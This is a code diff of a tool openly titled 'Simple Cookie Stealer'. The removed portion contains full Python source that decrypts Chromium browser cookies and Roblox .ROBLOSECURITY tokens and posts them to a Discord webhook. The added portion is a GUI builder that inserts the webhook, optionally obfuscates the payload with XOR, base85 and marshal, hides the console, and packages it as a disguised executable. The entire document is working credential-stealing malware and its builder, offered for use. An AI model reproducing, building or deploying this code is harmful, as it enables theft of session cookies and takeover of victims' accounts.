@@ -1,219 +1,226 @@
-import os
-import base64
-import shutil
-import marshal
-import traceback
-import subprocess
+try:
+    from tkinter import *
+    import customtkinter
+    import os
+    import ctypes
+    import random
+    import base64
+    import marshal
+    import shutil
+    import virtualenv
+    import requests
+    import threading
+except ImportError:
+    ctypes.windll.user32.MessageBoxW(0, "Please install the required libraries in requirements.txt", "Error", 0)
+    exit()
 
-if "Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Manage App Execution Aliases." in subprocess.check_output("python --version").decode():
-    os.system("powershell Remove-Item $env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe") # Remove the bugged app alias that Microsoft added (Because Microsoft doesn't do anything right)
-    os.system("cls")
+version = "1.0"
 
-if "is not recognized" in subprocess.check_output("python --version").decode():
-    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
-    while True: pass
+webhook = "" # Webhook URL
+obfuscate = False # Obfuscate the payload
+hideConsole = False # Hide the console when the payload is ran
+virtualenvir = False
+inputFileName = "" # Input file name
+comboBoxFileType = "EXE" # File type
 
-os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
-os.system("cls")
+def build():
+    if not os.path.exists("main.py"):
+        ctypes.windll.user32.MessageBoxW(0, "main.py not found. Reinstall this program!", "Error", 0)
+        return
+    
+    with open("main.py", "r") as file:
+        data = file.read()
+    
+    _filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(10)])
+    filename = _filename + "_tmp.py"
 
-if "is not recognized" in subprocess.check_output("pyinstaller --version").decode():
-    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
-    while True: pass
+    data = data.replace("WEBHOOK GOES HERE", webhook)
 
-webhook = input("Paste your Webhook: ")
-obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
-console = input("Show the Console when running? (Y/N): ")
+    if obfuscate:
+        randomXor = random.randint(1, 255)
+        data = f"""import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(bytes([x^{randomXor} for x in {bytes([x^randomXor for x in base64.b85encode(marshal.dumps(compile(data, "q", "exec")))])}]))))"""
 
-id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
+    with open(filename, "w") as file:
+        file.write(data)
 
-code = f"""
-webhook = "{webhook}" # WEBHOOK HERE
+    if virtualenvir:
+        os.system(f"virtualenv {_filename}")
+        exec(open(f"{_filename}\\Scripts\\activate_this.py").read(), {'__file__': f"{_filename}\\Scripts\\activate_this.py"})
+        os.system(f"{_filename}\\Scripts\\pip install -r requirements.txt")
 
-import os
-import json
-import base64
-import shutil
-import sqlite3
-import requests
-import subprocess
+    scriptsPath = f"{_filename}\\Scripts\x5c" # Apparently you're not allowing to put escaped backslashes at the end of strings, so I had to do the hex thingy.
 
-from win32crypt import CryptUnprotectData
-from Crypto.Cipher import AES 
+    os.system(f"{scriptsPath if virtualenvir else ''}pyinstaller --onefile {'--noconsole' if hideConsole else ''} --clean --icon=NONE " + filename)
+    os.remove(filename)
+    shutil.rmtree("build")
+    shutil.copy2("dist\\" + filename.replace(".py", ".exe"), filename.replace(".py", ".exe"))
+    shutil.rmtree("dist")
+    os.remove(filename.replace(".py", ".spec"))
+    shutil.rmtree(_filename)
+    os.rename(filename.replace(".py", ".exe"), f"{inputFileName}.{comboBoxFileType.lower()}")
 
-def safe(func):
-    def wrapper(*args, **kwargs):
-        try:
-            return func(*args, **kwargs)
-        except Exception:
-            pass
-    return wrapper
-
-class CookieLogger:
-
-    appdata = os.getenv('APPDATA')
-    localappdata = os.getenv('LOCALAPPDATA')
+class GUI(customtkinter.CTk):
 
     def __init__(self):
-        browsers = self.findBrowsers()
+        global version
+        super().__init__()
 
-        cookies = []
-        for browser in browsers:
-            try:
-                cookies.append(self.getCookie(browser[0], browser[1]))
-            except Exception:
-                pass
+        self.title("Simple Cookie Stealer")
+        self.geometry("700x400")
+        self.resizable(False, False)
+        customtkinter.set_default_color_theme("theme.json")
 
-        try:
-            cookies.append(("Roblox App", ("None", '\\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
-        except Exception:
-            pass
-        
-        cookieDoc = ""
+        GeneralLabel = customtkinter.CTkLabel(master=self, text="Cookie Stealer", font=("Arial", 20))
+        GeneralLabel.place(x=5, y=5)
 
-        for cookie in cookies:
-            if cookie == None or not cookie[1]:
-                continue
+        versionInfo = customtkinter.CTkLabel(master=self, text=f"Simple Cookie Stealer v{version}", font=("Arial", 10))
+        versionInfo.place(x=5, y=375)
 
-            for _cookie in cookie[1]:
-                cookieDoc += f"Browser: {{cookie[0]}}\\nProfile: {{_cookie[0]}}\\nCookie: {{_cookie[1]}}\\n\\n"
-                
-        if not cookieDoc: cookieDoc = "No Cookies Found!"
-        
-        requests.post(webhook, files = {{"cookies.txt": cookieDoc}})
+        self.configButton = customtkinter.CTkButton(master=self, text="Config", width=153, command=self.goToConfig, corner_radius=0, fg_color="#363636", hover_color="#363636")
+        self.configButton.place(x=0, y=50)
+
+        self.helpButton = customtkinter.CTkButton(master=self, text="Help", width=153, command=self.goToHelp, corner_radius=0, fg_color="#242424", hover_color="#363636")
+        self.helpButton.place(x=0, y=80)
+
+        self.creditsButton = customtkinter.CTkButton(master=self, text="Credits", width=153, command=self.goToCredits, corner_radius=0, fg_color="#242424", hover_color="#363636")
+        self.creditsButton.place(x=0, y=110)
+
+        self.configFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
+        self.configFrame.place(x=153, y=0)
+
+        self.helpFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
+
+        self.creditFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
+
+        self.webhookBox = customtkinter.CTkEntry(master=self.configFrame, width=400, placeholder_text="Webhook URL")
+        self.webhookBox.place(x=5, y=5)
+
+        self.buildButton = customtkinter.CTkButton(master=self.configFrame, text="Build", width=132, command=self.handleBuildButton)
+        self.buildButton.place(x=410, y=5)
+
+        self.boxObfuscate = customtkinter.CTkCheckBox(master=self.configFrame, text="Obfuscate EXE", command=self.handleBoxObfuscate)
+        self.boxHideConsole = customtkinter.CTkCheckBox(master=self.configFrame, text="Hide Console", command=self.handleBoxHideConsole)
+        boxVirtualCompiler = customtkinter.CTkCheckBox(master=self.configFrame, text="Virtual Compiling Environment", command=self.handleBoxVirtualCompiler)
+        self.inputFileName = customtkinter.CTkEntry(master=self.configFrame, width=200, placeholder_text="Input File Name")
+        self.comboBoxFileType = customtkinter.CTkComboBox(master=self.configFrame, width=70, values=["EXE", "SCR", "COM", "BAT", "CMD"], command=self.handleComboBoxFileType)
+        self.boxObfuscate.place(x=5, y=40)
+        self.boxHideConsole.place(x=5, y=70)
+        boxVirtualCompiler.place(x=5, y=100)
+        self.inputFileName.place(x=5, y=130)
+        self.comboBoxFileType.place(x=210, y=130)
+
+        self.creditText = customtkinter.CTkTextbox(master=self.creditFrame, width=537, height=390, fg_color="#292929")
+        self.creditText.insert(END, f"""Simple Cookie Stealer v{version}
+
+Simple Cookie Stealer and Builder are created and brought to you by DeKrypt.
+Offical GitHub Repository: https://github.com/dekrypted/simple-cookie-stealer
+
+Credits:
+DeKrypt - GUI Builder
+DeKrypt - Cookie Stealer Source
+ThePythonCode - Chrome Decryption (https://www.thepythoncode.com/article/extract-chrome-passwords-python)
+CustomTkinter - Library for GUI (https://customtkinter.tomschimansky.com/)
+PyInstaller - EXE Builder (https://www.pyinstaller.org/)
+pycryptodome - pycryptodome library (https://pypi.org/project/pycryptodome/)
+pywin32 - pywin32 library (https://pypi.org/project/pywin32/)
+requests - requests library (https://pypi.org/project/requests/)
+Python - Programming Language (https://www.python.org/)
+                               
+And you! Thanks for using Simple Cookie Stealer!
+""")
+        self.creditText.configure(state=DISABLED)
+        self.creditText.place(x=5, y=5)
+
+        self.helpText = customtkinter.CTkTextbox(master=self.helpFrame, width=537, height=390, fg_color="#292929")
+        self.helpText.insert(END, """Welcome to Simple Cookie Stealer!
+Webhook:
+Discord Webhook URL to send the cookies to.
+
+Obfuscate EXE:
+Obfuscate the EXE file to make it harder to reverse engineer.
+
+Hide Console:
+Hide the console when the EXE file is ran.
+
+Virtual Compiling Environment:
+Generate a Virtual Python instance to compile the EXE. Smaller file size, but slower compile time.
+
+Yes, I know there isn't much here. It's a SIMPLE Cookie Stealer :)
+        """)
+        self.helpText.configure(state=DISABLED)
+        self.helpText.place(x=5, y=5)
+
+    def goToConfig(self):
+        self.configFrame.place(x=153, y=0)
+        self.helpFrame.place_forget()
+        self.creditFrame.place_forget()
+        self.configButton.configure(fg_color="#363636")
+        self.helpButton.configure(fg_color="#242424")
+        self.creditsButton.configure(fg_color="#242424")
     
-    @safe
-    def findBrowsers(self):
-        found = []
+    def goToHelp(self):
+        self.helpFrame.place(x=153, y=0)
+        self.configFrame.place_forget()
+        self.creditFrame.place_forget()
+        self.helpButton.configure(fg_color="#363636")
+        self.configButton.configure(fg_color="#242424")
+        self.creditsButton.configure(fg_color="#242424")
 
-        for root in [self.appdata, self.localappdata]:
-            for directory in os.listdir(root):
-                try:
-                    for _root, _, _ in os.walk(os.path.join(root, directory)):
-                        for file in os.listdir(_root):
-                            if file == "Local State":
-                                if "Default" in os.listdir(_root):
-                                    found.append([_root, True])
-                                elif "Login Data" in os.listdir(_root):
-                                    found.append([_root, False])
-                                else:
-                                    pass
-                except Exception:
-                    pass
+    def goToCredits(self):
+        self.creditFrame.place(x=153, y=0)
+        self.configFrame.place_forget()
+        self.helpFrame.place_forget()
+        self.configButton.configure(fg_color="#242424")
+        self.helpButton.configure(fg_color="#242424")
+        self.creditsButton.configure(fg_color="#363636")
 
-        return found
+    def handleWebhookBox(self):
+        global webhook
+        webhook = self.webhookBox.get()
+    
+    def handleInputFileName(self):
+        global inputFileName
+        inputFileName = self.inputFileName.get()
+    
+    def handleComboBoxFileType(self, _):
+        global comboBoxFileType
+        comboBoxFileType = self.comboBoxFileType.get()
 
-    @safe
-    def getMasterKey(self, browserPath):
-        with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
-            localState = json.loads(f.read())
-        
-        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
-        truncatedMasterKey = masterKey[5:]
+    def handleBuildButton(self):
+        self.handleWebhookBox()
+        self.handleInputFileName()
 
-        return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]
+        self.buildButton.configure(text="Building...")
+        self.buildButton.configure(state=DISABLED)
+        self.buildButton.update()
 
-    @safe
-    def decryptCookie(self, cookie, masterKey):
-        iv = cookie[3:15]
-        encryptedValue = cookie[15:]
+        if webhook == "":
+            ctypes.windll.user32.MessageBoxW(0, "Please enter a webhook URL.", "Error", 0)
+            self.buildButton.configure(text="Build")
+            self.buildButton.configure(state=NORMAL)
+            self.buildButton.update()
+            return
 
-        cipher = AES.new(masterKey, AES.MODE_GCM, iv)
-        decryptedValue = cipher.decrypt(encryptedValue)
+        threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, "Building! This takes a while, please be patient.", "Building", 0)).start()
+        build()
 
-        return decryptedValue[:-16].decode()
+        self.buildButton.configure(text="Build")
+        self.buildButton.configure(state=NORMAL)
+        self.buildButton.update()
 
-    @safe
-    def getCookie(self, browserPath, isProfiled):
+        ctypes.windll.user32.MessageBoxW(0, "Build Complete!", "Success", 0)
+    
+    def handleBoxVirtualCompiler(self):
+        global virtualenvir
+        virtualenvir = not virtualenvir
+    
+    def handleBoxObfuscate(self):
+        global obfuscate
+        obfuscate = not obfuscate
+    
+    def handleBoxHideConsole(self):
+        global hideConsole
+        hideConsole = not hideConsole
 
-        if browserPath.split("\\\\")[-1] == "User Data":
-            browserName = browserPath.split("\\\\")[-2]
-        else:
-            browserName = browserPath.split("\\\\")[-1]
-        
-        cookiesFound = []
-
-        profiles = ["Default"]
-        try:
-            masterKey = self.getMasterKey(browserPath)
-        except Exception:
-            return cookiesFound
-
-        if isProfiled:
-            for directory in os.listdir(browserPath):
-                if directory.startswith("Profile"):
-                    profiles.append(directory)
-        
-        if not isProfiled:
-            if "Network" in os.listdir(browserPath):
-                cookiePath = os.path.join(browserPath, "Network", "Cookies")
-            else:
-                cookiePath = os.path.join(browserPath, "Cookies")
-            
-            shutil.copy2(cookiePath, "temp.db")
-            connection = sqlite3.connect("temp.db")
-            cursor = connection.cursor()
-
-            cursor.execute("SELECT encrypted_value FROM cookies")
-            for cookie in cursor.fetchall():
-                if cookie[0]:
-                    decrypted = self.decryptCookie(cookie[0], masterKey)
-
-                    if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
-                        cookiesFound.append(("None", decrypted))
-                
-            connection.close()
-            os.remove("temp.db")
-        
-        else:
-            for profile in profiles:
-                if "Network" in os.listdir(os.path.join(browserPath, profile)):
-                    cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
-                else:
-                    cookiePath = os.path.join(browserPath, profile, "Cookies")
-
-                shutil.copy2(cookiePath, "temp.db")
-                connection = sqlite3.connect("temp.db")
-                cursor = connection.cursor()
-
-                cursor.execute("SELECT encrypted_value FROM cookies")
-                for cookie in cursor.fetchall():
-                    if cookie[0]:
-                        decrypted = self.decryptCookie(cookie[0], masterKey)
-
-                        if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
-                            cookiesFound.append((profile, decrypted))
-                
-                connection.close()
-                os.remove("temp.db")
-
-        return [browserName, cookiesFound]
-
-if __name__ == "__main__":
-    CookieLogger()
-
-"""
-
-try:
-    if obfuscate.lower().startswith("Y"):
-        newcode = f"""
-    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))"""
-    else:
-        newcode = code
-
-    open(f"tmp_{id}.py", "w").write(newcode)
-
-    os.system(f"pyinstaller --clean {'--noconsole ' if console.lower().startswith('Y') else ''}--onefile tmp_{id}.py")
-
-    shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
-    shutil.rmtree("dist")
-    shutil.rmtree("build")
-    os.remove(f"tmp_{id}.py")
-    os.remove(f"tmp_{id}.spec")
-
-    os.system("cls")
-
-    print("Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube.")
-    while True: pass
-except Exception:
-    print(traceback.format_exc() + "\n\nAn Error occured! See above, and make an issue on the GitHub repository or contact me if you can't solve it yourself!")
-    while True: pass
+gui = GUI()
+gui.mainloop()
